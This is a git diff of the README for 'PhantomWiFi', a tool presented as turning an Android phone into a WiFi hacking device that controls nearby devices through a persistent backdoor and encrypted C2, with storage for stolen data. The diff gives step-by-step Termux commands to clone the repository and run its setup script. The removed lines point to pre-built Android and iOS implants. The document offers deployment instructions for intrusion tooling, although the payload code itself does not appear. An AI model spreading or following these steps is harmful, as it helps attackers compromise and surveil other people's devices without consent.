@@ -11,13 +11,20 @@ Turn your Android phone into a WiFi hacking machine. Controls any device connect
 - Survives reboot (persistent backdoor)
 - Encrypted C2 communication
 
-## :package: Requirements
-1. **Android Phone 8.0+** (No root needed)  
-   [Download Termux](https://f-droid.org/repo/com.termux_118.apk)
-2. **GitHub Account**  
-   Hosting code: [Veran350/PhantomWiFi](https://github.com/Veran350/PhantomWiFi)
-3. **1GB Storage** (For logs/stolen data)
-4. **Step 2**: Run These Commands *Exactly*  
+- ## :package: Requirements  
+1. **Android 8.0+**  
+   - Install [Termux](https://f-droid.org/repo/com.termux_118.apk)  
+2. **1GB Storage**  
+
+---
+
+## :wrench: Step-by-Step Setup  
+
+### Step 1: Install Termux  
+1. Download and install Termux from the link above.  
+2. Open Termux and allow **storage permissions** when prompted.  
+
+### Step 2: Run These Commands *Exactly*  
 ```bash  
 termux-change-repo  
 # Press OK to select "Grimler" mirror  
@@ -26,19 +33,10 @@ termux-setup-storage
 # Allow storage access  
 
 termux-wifi-enable true  
-# Allow WiFi access
+# Allow WiFi access  
 
-###
 pkg install git  
 git clone https://github.com/Veran350/PhantomWiFi  
 cd PhantomWiFi  
 ./scripts/setup.sh  
 # Wait 3 minutes. DO NOT CLOSE TERMUX!
-
-## :arrow_down: Download Implants
-Pre-built files are included in the repo:
-```bash
-git clone https://github.com/Veran350/PhantomWiFi
-cd PhantomWiFi/implants
-# phantom.apk (Android payload)
-# phantom.mobileconfig (iOS profile)
